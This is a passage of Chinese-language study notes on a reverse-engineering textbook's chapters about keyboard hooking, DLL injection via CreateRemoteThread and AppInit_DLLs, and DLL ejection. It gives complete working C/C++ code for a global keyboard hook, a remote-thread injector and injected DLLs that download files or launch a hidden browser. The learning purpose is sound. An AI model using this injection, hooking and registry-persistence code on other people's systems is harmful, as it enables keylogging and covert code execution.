queue],发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理。\n\n\nQ：从图21-1\n\n如果设置好键盘消息钩子，处于钩链中的键盘消息钩子会比应用程序先看到信息\n在键盘消息钩子函数的内部，除了可以查看消息之外，还可以修改消息本身，而且还能对消息实施拦截，阻止消息传递。\n可以同时设置多个相同的键盘消息钩子。按照设置顺序依次调用这些钩子，它们组成的链条称为“钩链”。\n\nQ：Windows的钩取程序\n\nSPY++，能查看所有操作系统中来往的所有消息\n\n21.3 SetWindowsHookEx()Q：使用SetWindowsHookEx() API可以轻松实现钩子，API的定义如下\n\n\nhook procedure是由操作系统调用的回调函数。\n安装消息“钩子“时，“钩子”过程需要存在于某个DLL内部，且该DLL的示例句柄(instance handle)即是hMod。\n若dwThreadID参数被设置为0，则安装的钩子为“全局钩子”(GlobalHook)”，它会影响到运行中的(以及以后要运行的)所有进程。\n\n像这样，使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入 (injection)相应进程，然后调用注册的“钩子”过程。注入进程时用户几乎不需要做什么，非常方便。\nQ：关于idHook参数\n\nWH_KEYBOARD：\n它是一种高级键盘钩子，也称为线程钩子。\n属于应用程序级别的, 所以系统线程会早于这个Hook响应, 并且只能截获系统发送到应用线程message queue的消息, 但是优先执行该Hook的回调函数,如果Hook回调返回false才会继续处理当前应用的消息响应函数\n下面KeyHook.dll的KeyboardProc就是这个过程。\n\n\nWH_KEYBOARD_LL：\n它是一种low level键盘钩子，也称为全局钩子。\n当Raw Input Thread(RIT)决定从系统消息队列中分发消息之前, 就已经截获了这个消息进行了处理. 所以WH_KEYBOARD_LL甚至会早于系统线程来处理消息，我理解也就是图21-1中的黑色虚线是通过RIT完成的。\nRaw Input Thread(RIT) 是Windows 操作系统中的一个线程，用来处理原始数据(直接来自输入设备（如键盘、鼠标、游戏手柄等）的底层输入信息)\n\n\n并且WH_KEYBOARD_LL让系统不需要通过DLL来动态注入所有进程了,系统只会把消息发送到Hook线程\n\n\n\n&#x3D;&#x3D;Q：回调函数&#x3D;&#x3D;\n\n在特定事件发生时被调用的函数。具体来说，回调函数是通过函数指针传递给其他函数的，以便在适当的时候由被调用函数调用\n\n21.4 键盘消息钩取练习\n\nKeyHook.dll文件是一个含有钩子过程(KeyboardProc())的DLL文件。\nHookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载 KeyHook.dll文件后使用SetWindowsHookEx()安装键盘钩子(KeyboardProc)。\n若其他进程(explorer.exe iexplore.exe  notepad.exe等)中发生键盘输人事件(WM_KEYDOWN)，OS就会强制将KeyHook.dll加载到相应进程的内存，然后调用KeyboardProc()函数\n这里需要注意的一点是，OS会将KeyHook.dll强制加载到发生键盘输人事件的所有进程。换言之，消息钩取技术常常被用作一种DLL注人技术(后面会单独讲解DLL注入的相关内容)。\n\n21.4.1 练习HookMain.exe\n当打开HookMain.exe时，此时notepad是无法打字的\n使用Process Explorer查看notepad.exe进程，可以看到KeyHook.dll已经加载到其中\n在Process Explorer中检索注入KeyHook.dll的所有进程，如图21-5所示。\n一个进程开始运行并发生键盘事件时，KeyHook.dll就会注人其中(&#x3D;&#x3D;问题：但其实忽视键盘事件的仅有notepadexe进程，其他进程会正常处理键盘事件)&#x3D;&#x3D;\n\n\nQ：HookMain.exe终止 - 拆除键盘钩子\n\n输入q命令，可以拆除钩子\n此时记事本可以输入，不再有KeyHook.dll\n\n21.4.2 分析源代码Q：HookMain.exe的源代码\n\n\n加载KeyHook.dll\n开始钩取，用户输入q后，停止钩取\n\nQ：KeyHook.cpp\n\n这个整个的逻辑是基于WH_KEYBOARD，也就是图21-1.在os message queue和application queue 之间添加了消息钩子\n\n// KeyHook.cpp -> KeyHook.dll\n#include \"stdio.h\"\n#include \"windows.h\"\n\n#define DEF_PROCESS_NAME\t\t\"notepad.exe\"\n\nHINSTANCE g_hInstance = NULL;\nHHOOK g_hHook = NULL;\nHWND g_hWnd = NULL;\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)\n&#123;\n\tswitch( dwReason )\n\t&#123;\n        case DLL_PROCESS_ATTACH:\n\t\t\tg_hInstance = hinstDLL;\n\t\t\tbreak;\n\n        case DLL_PROCESS_DETACH:\n\t\t\tbreak;\t\n\t&#125;\n\n\treturn TRUE;\n&#125;\n\nLRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)\n&#123;\n\tchar szPath[MAX_PATH] = &#123;0,&#125;;\n\tchar *p = NULL;\n\tif(nCode == 0)\n\t&#123;\n\t\t// bit 31 : 0 => press, 1 => release\n\t\t// 按下按键时\n\t\tif( !(lParam &amp; 0x80000000) )\n\t\t&#123;\n\t\t\t// 搜索当前可执行文件的路径，并保存到szPath中\n\t\t\tGetModuleFileNameA(NULL, szPath, MAX_PATH);\n\t\t\tp = strrchr(szPath, '\\\\');\n\n            // 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序\n\t\t\tif( !_stricmp(p + 1, DEF_PROCESS_NAME))\n\t\t\t\treturn 1;\n\t\t&#125;\n\t&#125;\n    // 如果不是notepad.exe，则调用CallNextHookEx()函数，将消息传递给应用程序\n\treturn CallNextHookEx(g_hHook, nCode, wParam, lParam);\n\n&#125;\n\n#ifdef __cplusplus\nextern \"C\" &#123;\n#endif\n\t// 声明要导出的函数\n\t__declspec(dllexport) void HookStart()\n\t&#123;\n\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);\n\t&#125;\n\n\t__declspec(dllexport) void HookStop()\n\t&#123;\n\t\tif( g_hHook )\n\t\t&#123;\n\t\t\tUnhookWindowsHookEx(g_hHook);\n\t\t\tg_hHook = NULL;\n\t\t&#125;\n\t&#125;\n#ifdef __cplusplus\n&#125;\n#endif\n\n\n\n\n当调用HookStart函数时，就会用SetWindowsHookEx()函数，把KeyboardProc添加到键盘钩链\n\n\n\n这里面红框的内容就对应图21-1\n\n\n\n\nQ：执行流程\n\n安装好键盘“钩子”后，无论哪个进程，只要发生键盘输人事件，OS就会强制将KeyHook.dll注入相应进程。\n加载了KeyHookdll的进程中，发生键盘事件时会首先调用执行KeyHook.KeyboardProc()。\nKeyProc()函数中发生键盘输入事件，会比较当前进程的名称和”notepad.exe”，如果相同，返回1，终止KeyProc()函数，这就意味着截获或者删除消息。此时消息不会传递到notepad.exe程序的消息队列\n\n\n\n\n\n\n\n提示\n监视或记录用户键盘输入的程序被称为“键盘记录器”(Key Logger)。有些键盘记录器本身是 PC恶意代码，通过钩取键盘消息，在PC 用户不知情的情况下盗走用户的键盘输入，其工作原理与 KeyHook.dll的工作原理基本一致。\n\n\nQ：上述程序会卡死的原因(来自dragon blog)\n\n需要把WH_KEYBOARD改成WH_KEYBOARD_LL\n\n21.5 调试练习Q：调试方法\n\n需要找到核心代码：\n逐行跟踪\n检索相关API\n检索相关子符串\n\n\n\nQ：我的分析\n\n检索GetProcAddress API\n当然也可以用检索字符串，找”press q to quit”\n\nQ：调试main函数\n\n这里需要把WH_KEYBOARD，改写为WH_KEYBOARD_LL，之后重新生成KeyHook.dll\ngcc -shared -o KeyHook.dll test.c        //把test.c文件生成为KeyHook.dll\n\n再重新生成HookMain.exe\n\n\n总结Q：回调函数(CALLBACK)是什么?\n\n就是某个特定事件发生时被指定调用的函数。\n窗口Windows过程(WndProc)就是一个典型的回调函数(键盘、鼠标等事件发生时OS会调用注册的窗口过程)。\n\n\n\nQ：declspec函数是什么?\n\n是declaration specifier\n\ndeclspec是针对编译器的关键字，指出相应函数为导出函数，也就是不限于当前模块使用，其他模块也可以使用\n\n__declspec(dllexport) 和 __declspec(dllimport)，用于在 DLL（动态链接库）中声明需要导出或导入的函数或变量。\n\n\nQ.SetWindowsHookEx()API为什么在KeyHook.dll内部调用?您说它是安装钩子的API?\n\nA.是的。SetWindowsHookEx0) API用于将指定的“钩子”过程注册到钩链中。\n无论在DLI内部还是外部均可调用(编程时怎么方便怎么来)。\n\n0x23 DLL注入\nDLL注入是渗透其他进程的最简单有效的办法\n\n23.1 DLL注入Q：什么是DLL注入\n\nDLL注入指的是向运行中的其他进程强制插入特定的DLL文件。\n\nDLL注人 命令     其他进程自行调用Loadlibrary()API，加载(Loading)用户指定的DLL文件。\n\nDLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。\n\n\n加载到notepad.exe进程中的myhack.dll与已经加载到notepad.exe进程中的DLL(kernel32.dll、user32.dll)一样，拥有访问notepad.exe进程内存的(正当的)权限，这样用户就可以做任何想做的事了\n\n比如:向notepad添加通信功能以实现Messenger、文本网络浏览器等\n\n\n\n\n\n\n\n\n\n提示\nDLL 动态链接库\n\nDLL 被加载到进程后会自动运行 DIIMain()函数，用户可以把想执行的代码放到DIIMain()函数，每当加载 DLL时，添加的代码就会自然而然得到执行。利用该特性可修复程序 Bug，或向程序添加新功能。\n\n\n\nQ：DllMain()函数\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)\n&#123;\n    switch(dwReason)\n    &#123;\n        case DLL_PROCESS_ATTACH:\n            // 想要添加的代码\n            break;\n        case DLL_THREAD_ATTACH:\n            break;\n        case DLL_THREAD_DETACH:\n            break;\n        case DLL_PROCESS_DETACH:\n            break;    \n    &#125;\n    return TRUE;\n&#125;\n\n\n当一个进程加载一个 DLL 时，会依次经历以下阶段：\n\nDLL_PROCESS_ATTACH: 表示 DLL 正在被加载到进程空间。\n\nDLL_THREAD_ATTACH: 表示新线程正在创建或已经创建，并且将要与 DLL 进行关联。\n\nDLL_THREAD_DETACH: 表示已有线程正在退出或已经退出，并且与 DLL 的关联即将解除。\n\nDLL_PROCESS_DETACH: 表示 DLL 即将从进程空间中卸载。\n\n\n\n\n23.2 DLL注入示例\n使用LoadLibrary()API加载某个DLL时，该DLL中的DIIMain()函数就会被调用执行。\nDLL注人的工作原理就是**从外部促使目标进程调用LoadLibrary()API(**与一般DLL加载相同)\n所以会强制调用执行DLL的DIIMain()函数。\n并且，被注入的DLL拥有目标进程内存的访问权限，用户可以随意操作(修复Bug、添加功能等)。\n\n23.2.1 修bug\n直接修改程序比较困难时，用DLL技术为程序添加新功能\n\n23.2.2 消息钩取\nWindows OS默认的消息钩取就是DLL注入，OS会直接将已注册的钩取DLL注入目标进程\n\n23.2.3 API钩取23.3 DLL注入的实现方法Q：主要有下面三种方法\n\n创建远程线程(CreateRemoteThread() API)\n使用注册表(AppInit_DLLs值)\n消息钩取(SetWindowsHookEx() API)\n\n23.4 CreateRemoteThread()练习myhack.dll\n把myhack.dll和InjectDll.exe放到同一目录下\n\nInjectDll.exe是将向目标进程，注入DLL文件(myhack.dll)的程序。\n\n\n用管理员权限运行命令行，运行InjectDll.exe\n\nDebugView可以捕获显示系统运行进程输出的所有的调试字符串\n\n\nQ：最终结果\n\n会下载一个index.html到本地\n\n23.4.2 分析源代码myhack.dll// myhack.cpp -> myhack.dll\n#include \"windows.h\"\n#include \"tchar.h\"\n\n//是一个预处理指令，用于告诉编译器在链接阶段将 urlmon.lib 库文件包含到可执行文件中。\n#pragma comment(lib, \"urlmon.lib\")\n\n#define DEF_URL     \t(L\"http://www.naver.com/index.html\")\n#define DEF_FILE_NAME   (L\"index.html\")\n\nHMODULE g_hMod = NULL;\n\nDWORD WINAPI ThreadProc(LPVOID lParam)\n&#123;\n    TCHAR szPath[_MAX_PATH] = &#123;0,&#125;;\n\n    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )\n        return FALSE;\n\t\n    TCHAR *p = _tcsrchr( szPath, '\\\\' ); //查找tcsrchr(szPath, '\\\\') 将在 szPath 字符串中查找最后一个反斜杠字符的位置。\n    if( !p )\n        return FALSE;\n\n    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);//把index.html复制给p+1之后的位置\n\n    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);\n\n    return 0;\n&#125;\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n&#123;\n    HANDLE hThread = NULL;\n\n    g_hMod = (HMODULE)hinstDLL;\n\n    switch( fdwReason )\n    &#123;\n        case DLL_PROCESS_ATTACH : \n            OutputDebugString(L\"&lt;myhack.dll> Injection!!!\");\n            hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);\n            CloseHandle(hThread);\n            break;\n        &#125;\n    return TRUE;\n&#125;\n\nQ：代码中的pragma comment(lib, “urlmon.lib”)\n\n是一个预处理指令，用于告诉编译器在链接阶段将 urlmon.lib 库文件包含到可执行文件中。\n\nQ：编译过程包含的三个阶段\n\n预处理（Preprocessing）：\n在这个阶段，预处理器将对源代码进行处理，执行诸如宏展开、条件编译、头文件包含等操作。\n预处理器会根据预处理指令（如 #include、#define、#ifdef 等）修改源代码。\n预处理后的代码将成为编译器的输入。\n\n\n编译（Compilation）：\n在这个阶段，编译器将对预处理后的代码进行语法分析、词法分析和语义分析，生成中间表示（通常是目标代码）。\n编译器会将源代码翻译成汇编语言或机器码，但尚未生成可执行文件。\n编译器会执行优化操作，以提高生成的代码的效率和性能。\n\n\n链接（Linking）：\n在这个阶段，链接器将处理编译器生成的目标文件（或可重定位文件），以及所需的库文件，将它们组合在一起生成可执行文件。\n链接器会解析符号引用，将函数和变量的定义与引用进行匹配，生成最终的可执行文件。\n链接器还会处理外部符号的解析、地址重定位等任务，以确保程序能够正确地执行\n\n\n\nQ：上述代码的过程\n\n当dll加载到DLL_PROCESS_ATTACH，也就是正在被加载到进程空间时，会先输出字符串&lt;myhack.dll&gt; Injection!!!，之后会创建线程，调用ThreadProc()函数\n在ThreadProc()函数中，会调用 URLDownloadToFile来下载指定网站的index.html文件\n\nInjectDll.cpp// InjectDll.cpp -> InjectDll.exe\n// 用来将 myhack.dll 注入到 notepad.exe 进程\n#include \"windows.h\"\n#include \"tchar.h\"\n\nBOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) \n&#123;\n    TOKEN_PRIVILEGES tp;\n    HANDLE hToken;\n    LUID luid;\n\n    if( !OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) )\n    &#123;\n        _tprintf(L\"OpenProcessToken error: %u\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    if( !LookupPrivilegeValue(NULL,           // lookup privilege on local system\n                              lpszPrivilege,  // privilege to lookup \n                              &amp;luid) )        // receives LUID of privilege\n    &#123;\n        _tprintf(L\"LookupPrivilegeValue error: %u\\n\", GetLastError() ); \n        return FALSE; \n    &#125;\n\n    tp.PrivilegeCount = 1;\n    tp.Privileges[0].Luid = luid;\n    if( bEnablePrivilege )\n        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    else\n        tp.Privileges[0].Attributes = 0;\n\n    // Enable the privilege or disable all privileges.\n    if( !AdjustTokenPrivileges(hToken, \n                               FALSE, \n                               &amp;tp, \n                               sizeof(TOKEN_PRIVILEGES), \n                               (PTOKEN_PRIVILEGES) NULL, \n                               (PDWORD) NULL) )\n    &#123; \n        _tprintf(L\"AdjustTokenPrivileges error: %u\\n\", GetLastError() ); \n        return FALSE; \n    &#125; \n\n    if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )\n    &#123;\n        _tprintf(L\"The token does not have the specified privilege. \\n\");\n        return FALSE;\n    &#125; \n\n    return TRUE;\n&#125;\n\nBOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)\n&#123;\n    HANDLE hProcess = NULL, hThread = NULL;\n    HMODULE hMod = NULL;\n    LPVOID pRemoteBuf = NULL;\n    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);\n    LPTHREAD_START_ROUTINE pThreadProc;\n\n    // #1. 使用dwPID获取目标进程（notepad.exe）的句柄\n    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )\n    &#123;\n        _tprintf(L\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError());\n        return FALSE;\n    &#125;\n\n    // #2. 在目标进程（notepad.exe）中分配 dwBufSize 大小的内存\n    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);\n\n    // #3. 将 myhack.dll 的路径写入分配的内存 pRemoteBuf\n    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);\n\n    // #4. 获取 LoadLibraryA() API的地址\n    hMod = GetModuleHandle(L\"kernel32.dll\");\n    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \"LoadLibraryW\");\n\t\n    // #5. 重点，在目标进程（notepad.exe）中运行线程\n    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);\n    WaitForSingleObject(hThread, INFINITE);\t\n\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n\n    return TRUE;\n&#125;\n\nint _tmain(int argc, TCHAR *argv[])\n&#123;\n    if(argc != 3)\n    &#123;\n        _tprintf(L\"USAGE : %s &lt;pid> &lt;dll_path>\\n\", argv[0]);\n        return 1;\n    &#125;\n\n    // \n    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )\n        return 1;\n\n    // inject dll\n    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )\n        _tprintf(L\"InjectDll(\\\"%s\\\") success!!!\\n\", argv[2]);\n    else\n        _tprintf(L\"InjectDll(\\\"%s\\\") failed!!!\\n\", argv[2]);\n   \n    return 0;\n&#125;\n\n首先会检查输入的参数，然后设置权限\n之后调用InjectDll函数，该函数是命令目标进程(notepad.exe)自行调用LoadLibrary(“myhack.dll”) API\n\n获取目标进程notepad.exe句柄：\n\nhProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)\n\n也就是获取notepad.exe的句柄(PROCESS_ALL_ACCESS权限)，获取权限后，就可以用获取的句柄hProcess来控制对应的进程notepad.exe\n\nQ：啥是进程句柄？\n\n标识进程：进程句柄用于唯一标识操作系统中的进程。通过句柄，可以确定特定进程的上下文信息，如进程ID、进程优先级等。\n控制进程：进程句柄可以用于控制和操作进程。通过句柄，可以发送信号、获取和修改进程状态、分配和释放资源等。\n\n\n将要注入的DLL路径写入目标进程内存\n\npRemoteBuf = VirtualAllocEx(hProcess, NULL, d=wBufSize, MEM_COMMIT, PAGE_READWRITE);\n\n需要把即将加载的DLL文件路径告知目标进程(notepad.exe)。\n因为任何内存空间都无法进行写入操作，故先使用VirtualAllocEx() API在目标进程(notepadexe)的内存空间中分配一块缓冲区，且指定该缓冲区的大小为DLL文件路径字符串的长度(含Terminating NULL)即可。\nVirtualAllocEx函数的返回值pRemoteBuf分配所得的缓冲区地址，该地址是hProcess句柄所指目标进程notepad.exe的内存地址\n\nWriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);\n\n使用WriteProcessMemory()API将DLL路径字符串(“C:\\work\\dummy.dll”)写入分配所得缓冲区(pRemoteBuf)地址。\nWriteProcessMemory（）API所写的内存空间也是hProcess句柄所指的目标进程(notepad.exe)的内存空间\n这样要注人的DLL文件的路径就被写人目标进程(notepad.exe)的内存空间。\n\n\n\n\n\n\n\n提示\n\nWindows 操作系统提供了调试 API，借助它们可以访问其他进程的内存空间。其中具有代表性的有 VirtualAllocEx()、VrtualFreeEx()、WriteProcessMemory()、ReadProcessMemory())等。\n\n\n\n\n获取LoadLibraryW() API地址\n\nhMod = GetModuleHandle(L\"kernel32.dll\");\npThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \"LoadLibraryW\");\n\n\nLoadLibraryW是LoadLibrary()的Unicode字符串版本\n\nQ：我们的目标是获得加载到notepad.exe中的kernel32.dll中LoadLibraryW() API的地址\n\n但是上面的代码获取的是加载到当前代码，也就是InjectDll.exe中的kernel32.dll中的LoadLibraryW() API的地址\n那这两个Kernel32.dll的地址是一样的么？\n如果是一样的，上述代码就没问题\n\n\n在Windows系统中，kernel32.dll在每个进程中的加载地址都是相同的\n\n\n\n\n\n\n\n提示\n根据OS类型、语言、版本不同，kernel32.dll 加载的地址也不同。并且 Vista&#x2F;7中应用了新的 ASLR功能，每次启动时，系统 DLL加载的地址都会改变。\n但是在系统运行期间它都会被映射(Mapping)到每个进程的相同地址。\n\nWindows 操作系统中，DLL首次进入内存称为“加载”(Loading)\n以后其他进程需要使用相同 DLL时不必再次加载，只要将加载过的 DLL代码与资源映射一下即可，这种映射技术有利于提高内存的使用效率。\n\n\n\nQ：系统DLL的ImageBase\n\n一般而言，DLL文件的ImageBase默认为0x10000000，依次加载a.dll和b.dll时，先加载的a.dll被正常加载到此处，那么b.dll就没法加载了，于是发生重定位\n\n实际上，Kernel32.dll不管在哪个进程都会被加载到相同地址，微软整理了一份OS 核心DLL文件的ImageBase值，防止各DLL文件加载时出现区域重合，这样加载DLL文件时就不会发生DLL重定位了\n\n\n\n\n在目标进程中执行remote thread\nhThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);\n/**\nhProcess是notepad.exe的进程句柄\npThreadProc是notepad.exe中的LoadLibraryW()的地址\npRemoteBuf是恶意.dll的字符串地址\n*/\n\n\n\n因为这里需要让他执行LoadLibraryW()函数，但是并没有直接的API\n\n这里用CreateRemoteThread，在DLL注入经常会用到，用于在目标进程中执行它创建出来的线程\n\n\n除第一个参数hProcess外，其他参数与CreateThread（）函数完全一样。\n\nhProcess参数是要执行线程的目标进程(或称“远程进程”“宿主进程”)的句柄。\nlpStartAddress与lpParameter参数分别给出线程函数地址与线程参数地址。\n需要注意的是，这2个地址都应该在目标进程虚拟内存空间中(这样目标进程才能认识它们)。\n\n\n\nQ：这里用CreateRemoteThread()的原因\n\n观察ThreadProc()于LoadLibrary() API\n\n\n都有一个4字节的参数，并返回一个4字节的值。\n\n相当于执行执行创建线程的函数，相当于驱使目标进程调用LoadLibrary函数，从而加载指定的dll文件\n\n\n&#x3D;&#x3D;问题：这里为什么不能像HookMain一样呢？&#x3D;&#x3D;\n\n就是用typedef定义一个函数\n\n23.4.3 调试方法\n因为我的一直卡死，且我没法生成32位的.exe,这里就不尝试了\n\nQ：具体步骤\n\n使用attach附加运行中的进程notepad.exe\n在Option对话框中的Events中选择Pause on new moudule(DLL)，这样每当有新的DLL被加载到notepad.exe，都会在该DLL的EP处暂停\n但是在运行时，发现调试器暂停的地方不是在myhack.dll的EP，而是在MSASN1.dll的EP。\n加载myhack.dll前，需要先加载它导人的所有DLL文件，MSASN1.dll文件即在该过程中被加载。\nOllyDbg2的Pause on new module(DLL)被选中时，每当加载新的dl文件，都暂停在相应DLL文的EP处。不断按(F9)运行键，直到在mvhack.dll的EP处暂停。\n\n\n\n23.5 AppInit_DLLsQ：进行DLL注入的第二种方式\n\n用注册表\nWindows操作系统的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项\n\nQ：具体操作\n\n在注册表编辑器中，将要注入的DLL的路径字符串写人AppInit_DLLs项目,然后把LoadAppInit_DLLs的项目值设置为1。\n重启后，指定DLL会注人所有运行进程。该方法操作非常简单，但功能相当强大\n\nQ：上述方法的工作原理\n\nUser32.dll 被加载到进程时，会读取 AppInit_DLLs 注册表项，若有值，则调用 LoadLibrary() API加载用户DLL。\n\n所以，严格地说，相应 DLL并不会被加载到所有进程，而只是加载至加载user32.dll 的进程。\n\nWindowsXP会忽略 LoadAppInit DLLs 注册表项。\n\n\n\n23.5.1 分析源代码myhack2.cpp// myhack2.cpp -> myhack2.dll\n\n#include \"windows.h\"\n#include \"tchar.h\"\n\n#define DEF_CMD  L\"c:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\" \n#define DEF_ADDR L\"http://www.naver.com\"\n#define DEF_DST_PROC L\"notepad.exe\"\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n&#123;\n    TCHAR szCmd[MAX_PATH]  = &#123;0,&#125;;\n    TCHAR szPath[MAX_PATH] = &#123;0,&#125;;\n    TCHAR *p = NULL;\n    STARTUPINFO si = &#123;0,&#125;;\n    PROCESS_INFORMATION pi = &#123;0,&#125;;\n\n    si.cb = sizeof(STARTUPINFO);\n    si.dwFlags = STARTF_USESHOWWINDOW;\n    si.wShowWindow = SW_HIDE;\n\n    switch(fdwReason)\n    &#123;\n        case DLL_PROCESS_ATTACH: \n            if( !GetModuleFileName(NULL, szPath, MAX_PATH ))\n                break;\n            if(!(p = _tcsrchr(szPath, '\\\\')))\n                break;\n            // _tcsicmp是一个宏，比较p+1是否等于notepad.exe\n            if(_tcsicmp(p+1, DEF_DST_PROC))\n                break;\n\t\t   // 写到 szcmd 中\n        \twsprintf(szCmd, L\"%s %s\", DEF_CMD, DEF_ADDR);\n            // 执行 szcmd 指令\n        \tif(!CreateProcess(NULL, (LPTSTR)(LPCTSTR)szCmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi) )\n            \tbreak;\n\n        \tif(pi.hProcess != NULL)\n            \tCloseHandle(pi.hProcess);\n        \tbreak;\n    &#125;\n   \n    return TRUE;\n&#125;\n\n\n如果当前加载自己的进程是notepad.exe，则运行iexplore.exe，并连接指定的http://www.naver.com网站\n\n23.5.2 练习myhack2.dllQ：步骤\n\n运行注册表编辑器regedit.exe，进入如下路径：\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n\n修改AppInit_DLLS的值为myhack.dll所在位置，修改LoadAppInit_DLLs注册表项的值为1\n\n\nQ：重启系统\n\nmyhack2.dll成功注入所有加载user32.dll的进程\n\n\n但是因为上面的代码里只是notepad.exe，所以在notepad.exe中可以看到IE被以隐藏模式执行\n\n\n23.6  SetWindowsHookEx()\n利用消息钩取也可以实现DLL注入\n利用SetWindowsHookEx()安装好消息钩子之后，由OS将指定DLL强制注入相应进程\n\nQ：我的理解\n\n也就是只要发生钩子过程，就会发生DLL注入，os就会强制把相应DLL注入所有进程。\n\nQ：举个例子\n\n一旦有一个.exe程序执行了SetWindowsHookEx()，安装消息钩子\ng_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); //KeyHook.dll\n\n那么观察到hook type是WH_KEYBOARD，那么就会把KeyHook.dll注入所有的发生键盘输入事件的进程，之后调用KeyboardProc函数。\n\n综上调用SetWindowsHookEx()就会发生DLL注入。\n\n\n23.7 小结Q：前面的讲解中提到“CreateRemoteThread()实际调用的是LoadLibrary()”，实际生成的不是线程吗?\n\n是的，会在目标进程中创建线程。与普通意义上的创建线程相比，调用LoadLibrary(）据了很大比重\n\n总结Q：关于CTF的一些思考\n\n利用CreateRemoteThread()可以执行线程，线程里面可以放函数地址和参数地址，这相当于可以利用CreateRemoteThread()进行远程代码执行。\n\n0x24 DLL卸载\nDLL卸载(Ejection)是将强制插入的DLL弹出的一种技术，工作原理和CreateRemoteThreadAPI进行DLL注入的原理类似\n\n24.1 DLL卸载的工作原理Q：DLL注入 vs  DLL卸载\n\n之前使用CreateRemoteThreadAPI进行DLL注入，主要是驱使目标进程调用LoadLibrary()加载指定的DLL文件\nDLL卸载：驱使目标进程调用FreeLibrary() API\n也就是将FreeLibrary()API的地址传递给CreateRemoteThread()的IpStartAddress参数，并把要卸载的DLL的句柄传递给lpParameter参数。\n\n\n\n24.2 实现DLL卸载Q：分析EjectDll.exe程序，它用来从目标进程(notepad.exe)卸载指定的DLL文件(myhack.dll，已注入目标进程)\n// EjectDll.cpp -> EjectDll.exe\n\n#include \"windows.h\"\n#include \"tlhelp32.h\"\n#include \"tchar.h\"\n\n#define DEF_PROC_NAME\t(L\"notepad.exe\")\n#define DEF_DLL_NAME\t(L\"myhack.dll\")\n\nDWORD FindProcessID(LPCTSTR szProcessName)\n&#123;\n    DWORD dwPID = 0xFFFFFFFF;\n    HANDLE hSnapShot = INVALID_HANDLE_VALUE;\n    PROCESSENTRY32 pe;\n\n    // Get the snapshot of the system\n    // CreateToolhelp32Snapshot可以获取指定进程以及其使用的堆、模块和线程的快照\n    pe.dwSize = sizeof(PROCESSENTRY32);\n    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);\n\n    // find process\n    // 查找进程\n    Process32First(hSnapShot, &amp;pe);\n    do\n    &#123;\n        if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))\n        &#123;\n            dwPID = pe.th32ProcessID;\n            break;\n        &#125;\n    &#125;\n    while(Process32Next(hSnapShot, &amp;pe));\n\n    CloseHandle(hSnapShot);\n\n    return dwPID;\n&#125;\n\n\nBOOL EjectDll(DWORD dwPID, LPCTSTR szDllName)\n&#123;\n    BOOL bMore = FALSE, bFound = FALSE;\n    HANDLE hSnapshot, hProcess, hThread;\n    HMODULE hModule = NULL;\n    MODULEENTRY32 me = &#123;sizeof(me)&#125;;\n    LPTHREAD_START_ROUTINE pThreadProc;\n\n    // dwPID = notepad 进程的 ID\n    // 使用 TH32CS_SNAPMODULE 参数，获取加载到 notepad 进程的 DLL 名称\n    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);\n\n    // 遍历比较 dll 名称与 myhack.dll\n    bMore = Module32First(hSnapshot, &amp;me);\n    for(; bMore; bMore = Module32Next(hSnapshot, &amp;me))\n    &#123;\n        if(!_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName))\n        &#123;\n            bFound = TRUE;\n            break;\n        &#125;\n    &#125;\n\n    if(!bFound)\n    &#123;\n        